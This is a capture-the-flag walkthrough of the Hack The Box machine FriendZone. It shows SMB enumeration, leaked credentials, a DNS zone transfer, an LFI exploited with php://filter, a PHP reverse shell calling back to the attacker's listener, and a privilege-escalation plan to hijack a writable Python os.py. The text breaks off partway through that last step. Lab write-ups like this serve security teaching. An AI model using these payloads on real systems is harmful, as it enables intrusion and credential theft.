+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-p</span> 445 <span class="nt">-Pn</span> friendzone.htb  <span class="nt">--script</span> smb-enum-shares
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-22 12:27 EST
+Stats: 0:00:01 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Script Scan
+NSE Timing: About 0.00% <span class="k">done
+</span>Stats: 0:00:02 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Script Scan
+NSE Timing: About 0.00% <span class="k">done
+</span>Nmap scan report <span class="k">for </span>friendzone.htb <span class="o">(</span>10.10.10.123<span class="o">)</span>
+Host is up <span class="o">(</span>0.0095s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   <span class="se">\\</span>10.10.10.123<span class="se">\D</span>evelopment: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:<span class="se">\e</span>tc<span class="se">\D</span>evelopment
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   <span class="se">\\</span>10.10.10.123<span class="se">\F</span>iles: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files /etc/Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:<span class="se">\e</span>tc<span class="se">\h</span>ole
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   <span class="se">\\</span>10.10.10.123<span class="se">\I</span>PC<span class="nv">$:</span> 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service <span class="o">(</span>FriendZone server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:<span class="se">\t</span>mp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   <span class="se">\\</span>10.10.10.123<span class="se">\g</span>eneral: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:<span class="se">\e</span>tc<span class="se">\g</span>eneral
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   <span class="se">\\</span>10.10.10.123<span class="se">\p</span>rint<span class="nv">$:</span> 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:<span class="se">\v</span>ar<span class="se">\l</span>ib<span class="se">\s</span>amba<span class="se">\p</span>rinters
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>2.19 seconds
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>The results tell us we have <code class="language-plaintext highlighter-rouge">READ/WRITE</code> access to the <code class="language-plaintext highlighter-rouge">Development</code> and <code class="language-plaintext highlighter-rouge">general</code> share, but <code class="language-plaintext highlighter-rouge">smbmap</code> tells us otherwise.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>smbmap <span class="nt">-H</span> friendzone.htb
+<span class="o">[</span>+] Guest session       IP: friendzone.htb:445  Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        print<span class="nv">$ </span>                                                 NO ACCESS       Printer Drivers
+        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
+        general                                                 READ ONLY       FriendZone Samba Server Files
+        Development                                             READ, WRITE     FriendZone Samba Server Files
+        IPC<span class="nv">$ </span>                                                   NO ACCESS       IPC Service <span class="o">(</span>FriendZone server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>There was nothing in the <code class="language-plaintext highlighter-rouge">Development</code> share but in the <code class="language-plaintext highlighter-rouge">general</code> share, there was a file <code class="language-plaintext highlighter-rouge">creds.txt</code> which seemed to contain some credentials.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>smbclient //friendzone.htb/general 
+Enter WORKGROUP<span class="se">\k</span>ali<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Jan 16 15:10:51 2019
+  ..                                  D        0  Wed Jan 23 16:51:02 2019
+  creds.txt                           N       57  Tue Oct  9 19:52:42 2018
+
+                9221460 blocks of size 1024. 6420980 blocks available
+smb: \&gt; get creds.txt
+getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \&gt; exit
+$ cat creds.txt
+admin:WORKWORKHhallelujah@#
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<p>The credentials seems to belong to some admin panel which we do not where is it yet so lets move on.</p>
+<h2 id="port-443-apache-httpd-2429">Port 443 <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.29</code>
+</h2>
+<p>According to the <code class="language-plaintext highlighter-rouge">nmap</code> results, the common name specified in the <code class="language-plaintext highlighter-rouge">SSL</code> cert was <code class="language-plaintext highlighter-rouge">friendzone.red</code>, so lets add it to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. Now lets browse to <code class="language-plaintext highlighter-rouge">https://friendzone.red</code>.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone2.png" alt=""></p>
+<p>If we look at the <code class="language-plaintext highlighter-rouge">HTML</code> source code, we see a comment.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone3.png" alt=""></p>
+<p>Going to <code class="language-plaintext highlighter-rouge">https://friendzone.red/js/js/</code>,</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone4.png" alt=""></p>
+<p>we see a <code class="language-plaintext highlighter-rouge">base64</code>-encoded string that become <code class="language-plaintext highlighter-rouge">gtocYaMn1G1611333797q9mUUbut0Z</code> when decoded, which I couldn’t make sense of it. However, when I refreshed the page multiple times, the <code class="language-plaintext highlighter-rouge">base64</code>-encoded string would keep changing, which led to me think this was probably nothing important.</p>
+<p>Lets see if performing a zone transfer for the <code class="language-plaintext highlighter-rouge">friendzone.red</code> will return any new domain names.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>host <span class="nt">-t</span> axfr friendzone.red friendzone.htb 
+Trying <span class="s2">"friendzone.red"</span>
+Using domain server:
+Name: friendzone.htb
+Address: 10.10.10.123#53
+Aliases: 
+
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 12534
+;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;friendzone.red.                        IN      AXFR
+
+;; ANSWER SECTION:
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.         604800  IN      AAAA    ::1
+friendzone.red.         604800  IN      NS      localhost.
+friendzone.red.         604800  IN      A       127.0.0.1
+administrator1.friendzone.red. 604800 IN A      127.0.0.1
+hr.friendzone.red.      604800  IN      A       127.0.0.1
+uploads.friendzone.red. 604800  IN      A       127.0.0.1
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<p>Again, we add the new subdomains to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
+...
+10.10.10.123 friendzone.htb friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>When we browse to <code class="language-plaintext highlighter-rouge">https://administrator1.friendzone.red</code>, we see a login page!</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone5.png" alt=""></p>
+<p>Remember the <code class="language-plaintext highlighter-rouge">creds.txt</code> we found in the <code class="language-plaintext highlighter-rouge">SMB</code> service? Using the credentials in it will log us in.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone6.png" alt=""></p>
+<p>It tells us to navigate to <code class="language-plaintext highlighter-rouge">/dashboard.php</code>.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone7.png" alt=""></p>
+<p>It says that the default params are <code class="language-plaintext highlighter-rouge">image_id=a.jpg&amp;pagename=timestamp</code> so lets append it to our URL.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone8.png" alt=""></p>
+<p>A line had suddenly pop up at the bottom. I was thinking this <code class="language-plaintext highlighter-rouge">pagename=timestamp</code> probably caused another file to be loaded and the file as probably called <code class="language-plaintext highlighter-rouge">timestamp.php</code>. Lets verify the existence of <code class="language-plaintext highlighter-rouge">timestamp.php</code>.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone9.png" alt=""></p>
+<p>It does exist! It looks like it appends a <code class="language-plaintext highlighter-rouge">.php</code> at the end of the name before attemping to include it. Let sees if we can retrieve the contents of <code class="language-plaintext highlighter-rouge">dashboard.php</code> by browsing to setting <code class="language-plaintext highlighter-rouge">pagename</code> to <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=dashboard</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre>PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>After decoding it, this is what we get:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre></td>
+<td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+
+<span class="c1">//echo "&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;";</span>
+<span class="c1">//echo "&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;";</span>
+<span class="k">echo</span> <span class="s2">"&lt;title&gt;FriendZone Admin !&lt;/title&gt;"</span><span class="p">;</span>
+<span class="nv">$auth</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"FriendZoneAuth"</span><span class="p">];</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">===</span> <span class="s2">"e7749d0f4b4da5d03e6e9196fd1d18f1"</span><span class="p">){</span>
+ <span class="k">echo</span> <span class="s2">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+
+<span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;"</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"image_id"</span><span class="p">])){</span>
+  <span class="k">echo</span> <span class="s2">"&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;image_name param is missed !&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;please enter it to show the image&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;default is image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+ <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+ <span class="nv">$image</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"image_id"</span><span class="p">];</span>
+ <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;img src='images/</span><span class="nv">$image</span><span class="s2">'&gt;&lt;/center&gt;"</span><span class="p">;</span>
+
+ <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;h1&gt;Something went worng ! , the script include wrong param !&lt;/h1&gt;&lt;/center&gt;"</span><span class="p">;</span>
+ <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"pagename"</span><span class="p">]</span><span class="mf">.</span><span class="s2">".php"</span><span class="p">);</span>
+ <span class="c1">//echo $_GET["pagename"];</span>
+ <span class="p">}</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+<span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;You can't see the content ! , please login !&lt;/center&gt;&lt;/p&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Now that we know we can perform <code class="language-plaintext highlighter-rouge">LFI</code>, we just need to find a way to upload our malicious <code class="language-plaintext highlighter-rouge">php</code> file. Lets see if <code class="language-plaintext highlighter-rouge">https://uploads.friendzone.red</code> has that feature.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone10.png" alt=""></p>
+<p>I attempted uploading various files such as actual images or <code class="language-plaintext highlighter-rouge">.php</code> files but I was not able to find them. This is where I remembered about the writable <code class="language-plaintext highlighter-rouge">Development</code> share that we found on the <code class="language-plaintext highlighter-rouge">SMB</code> server and it seems that it is mapped to the <code class="language-plaintext highlighter-rouge">/etc/Development</code> directory on the machine.</p>
+<h1 id="exploitation-1">Exploitation (1)</h1>
+<p>I downloaded this <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">file</a> and configured it to use my IP address and a port number of my choice.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>php-reverse-shell.php
+...
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.XX.XX'</span><span class="p">;</span>  // CHANGE THIS
+<span class="nv">$port</span> <span class="o">=</span> 1337<span class="p">;</span>      // CHANGE THIS
+</pre></td>
+</tr></tbody></table></code></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td>
+<td class="rouge-code"><pre>
+I then start my `nc` listener:
+
+```bash
+$ rlwrap nc -lvnp 1337                                    
+listening on [any] 1337 ...
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>and upload the file to the share.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>smbclient //friendzone.htb/Development
+Enter WORKGROUP<span class="se">\k</span>ali<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; put php-reverse-shell.php 
+putting file php-reverse-shell.php as \php-reverse-shell.php (116.6 kb/s) (average 116.6 kb/s)
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<p>Now if we browse to <code class="language-plaintext highlighter-rouge">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/php-reverse-shell</code>, we get a shell on our listener as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337                                    
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.123] 57202
+Linux FriendZone 4.15.0-36-generic <span class="c">#39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 20:55:00 up  4:32,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="enumeration-2">Enumeration (2)</h1>
+<p>In <code class="language-plaintext highlighter-rouge">/var/www</code>, where all the websites were running from, we see a file <code class="language-plaintext highlighter-rouge">mysql_data.conf</code> containing database credentials.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /var/www/mysql_data.conf
+<span class="k">for </span>development process this is the mysql creds <span class="k">for </span>user friend
+
+<span class="nv">db_user</span><span class="o">=</span>friend
+
+<span class="nv">db_pass</span><span class="o">=</span>Agpyu12!0.213<span class="err">$</span>
+
+<span class="nv">db_name</span><span class="o">=</span>FZ
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>With these credentials, we can switch to <code class="language-plaintext highlighter-rouge">friend</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
+www-data@FriendZone:/var/www<span class="nv">$ </span>su friend
+Agpyu12!0.213<span class="err">$</span>
+
+friend@FriendZone:/var/www<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>friend<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>friend<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>friend<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="usertxt">user.txt</h1>
+<p>The user flag is in <code class="language-plaintext highlighter-rouge">friend</code>’s home directory.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre>friend@FriendZone:/var/www<span class="nv">$ </span><span class="nb">cat</span> /home/friend/user.txt
+a9edXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="enumeration-3">Enumeration (3)</h1>
+<p>I uploaded <code class="language-plaintext highlighter-rouge">pspy</code> onto the machine in order to monitor for running processes and saw a <code class="language-plaintext highlighter-rouge">python</code> script being executed every now and then.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td>
+<td class="rouge-code"><pre>friend@FriendZone:/tmp<span class="nv">$ </span>./pspy
+...
+2021/01/20 20:10:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>31303  | /usr/bin/python /opt/server_admin/reporter.py 
+2021/01/20 20:10:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>31302  | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
+2021/01/20 20:10:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>31301  | /usr/sbin/CRON <span class="nt">-f</span> 
+...
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Here’s the contents of <code class="language-plaintext highlighter-rouge">/opt/server_admin/reporter.py</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td>
+<td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">to_address</span> <span class="o">=</span> <span class="s">"admin1@friendzone.com"</span>
+<span class="n">from_address</span> <span class="o">=</span> <span class="s">"admin2@friendzone.com"</span>
+
+<span class="k">print</span> <span class="s">"[+] Trying to send email to %s"</span><span class="o">%</span><span class="n">to_address</span>
+
+<span class="c1">#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+</span>
+<span class="c1">#os.system(command)
+</span>
+<span class="c1"># I need to edit the script later
+# Sam ~ python developer
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<p>Hmm we didnt have write permission to the file so we can’t really add our own <code class="language-plaintext highlighter-rouge">python</code> code to it.</p>
+<p>Let’s use <code class="language-plaintext highlighter-rouge">linux-smart-enumeration</code> to see we can get more information.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td>
+<td class="rouge-code"><pre>friend@FriendZone:/tmp<span class="nv">$ </span>./lse.sh <span class="nt">-l</span> 2
+<span class="o">============================================================(</span> file system <span class="o">)=====</span><span class="sb">````````````````````````````````````````</span> 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> fst000 Writable files outside user<span class="s1">'s home.............................. yes!                       
+---
+...
+/usr/lib/python2.7
+/usr/lib/python2.7/os.pyc
+/usr/lib/python2.7/os.py
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<p>It says that we have WRITE access to <code class="language-plaintext highlighter-rouge">os.py</code>! This means if we can inject code into the <code class="language-plaintext highlighter-rouge">os</code> module, it will be executed when the <code class="language-plaintext highlighter-rouge">os</code> module is imported, which <code class="language-plaintext highlighter-rouge">/opt/server_admin/reporter.py</code> will do!</p>
+<h1 id="exploitation-2">Exploitation (2)</h1>
+<p>We will just append code for a <code class="language-plaintext highlighter-rouge">python</code> reverse shell to the end of <code class="language-plaintext highlighter-rouge">os.py</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td>
+<td class="rouge-code"><pre>friend@FriendZone:/tmp$ cat /usr/lib/python2.7/os.py
+...
